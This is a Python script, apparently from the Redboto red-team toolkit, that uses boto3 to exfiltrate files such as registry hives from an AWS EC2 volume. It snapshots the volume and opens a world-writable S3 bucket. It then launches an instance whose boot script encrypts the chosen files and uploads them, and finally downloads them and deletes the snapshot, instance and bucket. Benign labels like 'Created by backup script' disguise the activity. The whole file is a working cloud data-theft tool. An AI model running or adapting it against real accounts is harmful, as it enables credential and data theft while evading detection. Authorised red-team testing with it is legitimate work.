#!/usr/bin/env python3
#!/usr/bin/env python3
# Original Author @elitest
# This script is part of Redboto
# https://github.com/elitest/Redboto/

# This script uses boto3 to exfiltrate files from an EC2 instance
# using a list of known paths and a target volume where those files
# may be.
# N.B. you will need a very well permissioned API key to perform all
# of these actions

# TODO: Better crypto solution, limited by memory currently
# TODO: I'd like to do a dry run, but not everything supports this
# TODO: Might be better to check key permissions instead
# TODO: Better error handling
# TODO: Check for volume based on instance ID
from cryptography.fernet import Fernet
import boto3, argparse, time, sys, time, random, string, json, base64

argparser = argparse.ArgumentParser(description='Copies Registry Hives from a running system to an s3 bucket')
argparser.add_argument('volume_id', help='EC2 Volume ID')
argparser.add_argument('--profile', default='default', help='The profile name in ~/.aws/credentials')
argparser.add_argument('region', help='The AWS region that you want to do everything in')
argparser.add_argument('files', help='The file with a list of files to download from the host')
argparser.add_argument('--description', default='Created by backup script', help='Snapshot description')
args = argparser.parse_args()

files = open(args.files, "r").read().split()
region = args.region
profile = args.profile
snapshot_name = 'Snapshot of ' + args.volume_id + '(' + time.strftime('%Y-%m-%dT%H:%M:%S %Z') + ')'

#This loads the aws profile specified
boto3.setup_default_session(profile_name=profile, region_name=region)
ec2 = boto3.resource('ec2')
client = boto3.client('ec2')
s3_client = boto3.client('s3')
s3 = boto3.resource('s3')

#This creates an encryption key for later use
k=Fernet.generate_key()


def createsnapshot():
    snapshot = ec2.create_snapshot(VolumeId=args.volume_id, Description=args.description)
    while snapshot.state != 'completed':
        sys.stdout.write(snapshot.progress+"\n")
        sys.stdout.write("Snapshot creation in progress\n")
        time.sleep(10)
        snapshot.load()
    else:
        sys.stdout.write("snapshot READY\n\n")
    sys.stdout.write('Created snapshot of ' + args.volume_id +' with ID ... %s\n\n' % snapshot.id)
    return(snapshot.id)

def creatinstance(snapid,bucket):
    sys.stdout.write('Creating instance.  This may take 5-10 minutes.\n\n')
    encryptor = """from cryptography.fernet import Fernet
import sys
open(sys.argv[2],'wb').write(Fernet(open('/tmp/k','rb').read()).encrypt(open(sys.argv[1],'rb').read()))"""

    b64e = base64.b64encode(encryptor)

    userDataBuilder = """#!/bin/bash
sudo mkdir /mnt/i
sudo mount -o nosuid,uid=1000,gid=1000 /dev/xvdb1 /mnt/i/    
echo "##KEYREPLACE##" > /tmp/k
echo "##ENCREPLACE##" | base64 -d > /tmp/e
"""

    for line in files:
        filename = line.replace("/",".")
        encryptBuilder = """
python /tmp/e /mnt/i##PATHREPLACE## ./##FILENAMEREPLACE##.enc
aws s3api put-object --bucket ##BUCKETREPLACE## --key ##FILENAMEREPLACE##.enc --body ./##FILENAMEREPLACE##.enc --no-sign-request --acl bucket-owner-full-control
"""
        encryptBuilder = encryptBuilder.replace("##PATHREPLACE##", line)
        encryptBuilder = encryptBuilder.replace("##FILENAMEREPLACE##", args.volume_id + "." +filename[1:])
        userDataBuilder += encryptBuilder

    userDataBuilder = userDataBuilder.replace("##KEYREPLACE##", k)
    userDataBuilder = userDataBuilder.replace("##ENCREPLACE##", b64e)
    userDataBuilder = userDataBuilder.replace("##BUCKETREPLACE##", bucket)

    zones = client.describe_availability_zones()
    zone = zones['AvailabilityZones'][0]['ZoneName']

    instance = ec2.create_instances(
        BlockDeviceMappings=[
            {

                'DeviceName': '/dev/xvdb',
                'Ebs': {
                    'SnapshotId': snapid,
                    #Clean up on shutdown automatically
                    'DeleteOnTermination': True,
                    #TODO
                    'VolumeSize': 30
                }
            },
        ],
        #Amazon Linux 2
        ImageId='ami-0fc61db8544a617ed',
        InstanceType='t2.micro',
        MaxCount=1,
        MinCount=1,
        Monitoring={
            'Enabled': False
        },
        Placement={
            'AvailabilityZone': zone
            },
        UserData=userDataBuilder,
        DryRun=False,
        InstanceInitiatedShutdownBehavior='terminate',
        NetworkInterfaces=[
            {
                'AssociatePublicIpAddress': True,
                'DeleteOnTermination': True,
                'Description': 'Maintenance',
                'DeviceIndex': 0
            },
        ]
    )
    #This is the thing that makes sure we don't delete the instance before the startup script finishes
    #I have not tested this with large file copies so this may need to be changed
    #My other idea is to write a finished file that we loop and look for
    waiter = client.get_waiter('instance_status_ok')
    waiter.wait(InstanceIds=[instance[0].id])
    sys.stdout.write('Created Instance ID ... %s\n\n' % instance[0].id)

    return instance[0].id

def createbucket(bucketname):
    s3_client.create_bucket(Bucket=bucketname)

    sys.stdout.write('Created Bucket ... %s\n\n' % bucketname)

def setbucketperms(bucketname):
    bucket_policy = {
        'Version': '2012-10-17',
        'Statement': [{
        'Sid': 'AddPerm',
        'Effect': 'Allow',
        'Principal': '*',
        'Action': ['s3:PutObject'],
        'Resource': 'arn:aws:s3:::%s/*' % bucketname
        }]
    }

    # Convert the policy from JSON dict to string
    bucket_policy = json.dumps(bucket_policy)

    # Set the new policy
    s3_client.put_bucket_policy(Bucket=bucketname, Policy=bucket_policy)


    sys.stdout.write('Set Permissions on Bucket ... %s\n\n' % bucketname)

def deletesnapshot(snapid):
    response = client.delete_snapshot(SnapshotId=snapid)
    sys.stdout.write('Deleted Snapshot ID ... %s\n\n' % snapid)
    return response

def deleteinstance(instanceid):
    response = client.terminate_instances(InstanceIds=[instanceid])
    sys.stdout.write('Deleted Instance ID ... %s\n\n' % instanceid)
    return response

def deletebucket(bucketname):
    s3_bucket = boto3.resource('s3').Bucket(bucketname)
    s3_bucket.objects.all().delete()
    s3_bucket.delete()

    sys.stdout.write('Deleted Bucket ... %s\n\n' % bucketname)

def dl_decrypt(bucket,keyname,enckey):
    try:
	    obj = s3.Object(bucket, keyname)
	    file = obj.get()['Body'].read() 

	    f = Fernet(enckey)
	    open(keyname.replace(".enc",""),'wb').write(f.decrypt(file))
	    sys.stdout.write("Succesfully downloaded and decrypted file: " + keyname.replace(".enc","") + "\n\n")
    except:
    	sys.stdout.write("File " + keyname  + "does not exist\n")
    	sys.stdout.write("Or something went very wrong\n\n")


#Generate a bucket name
bname=''.join(random.SystemRandom().choice(string.ascii_lowercase + string.digits) for _ in range(32))

# Again most of these functions don't do great error checking.
createbucket(bname)
setbucketperms(bname)
snapid=createsnapshot()
instanceid=creatinstance(snapid, bname)


for line in files:
    filename = line.replace("/",".")
    filename = args.volume_id + "." +filename[1:] + ".enc"
    dl_decrypt(bname,filename,k)

deletebucket(bname)
deletesnapshot(snapid)
deleteinstance(instanceid)
